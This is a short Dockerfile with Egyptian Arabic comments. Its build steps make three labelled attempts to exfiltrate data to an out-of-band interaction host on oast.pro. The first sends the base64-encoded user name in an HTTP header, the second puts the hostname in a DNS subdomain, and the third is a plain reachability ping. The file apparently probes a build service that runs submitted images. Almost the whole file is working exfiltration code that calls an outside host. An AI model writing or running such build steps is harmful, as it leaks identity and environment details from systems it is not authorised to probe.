FROM alpine:latest

# نزل curl و base64
RUN apk add --no-cache curl coreutils

# --- المحاولة 1: Exfiltration في الهيدر (مشفر) ---
# ده أنضف حل، بياخد اسم اليوزر ويشفره ويبعته
RUN DATA=$(whoami | base64 | tr -d '\n') && curl -H "X-User: $DATA" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/header_check || true

# --- المحاولة 2: Exfiltration في الرابط (بس متفرمت صح) ---
# بنشيل المسافات والسطور الزيادة قبل ما نحطها في الرابط
RUN HOST=$(hostname | tr -d '\n') && curl http://$HOST.d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro || true

# --- المحاولة 3: فحص الاتصال البسيط (Sanity Check) ---
# لو دول منفعوش وده نفع، يبقى المشكلة كانت في الـ Syntax
RUN curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/simple_ping || true
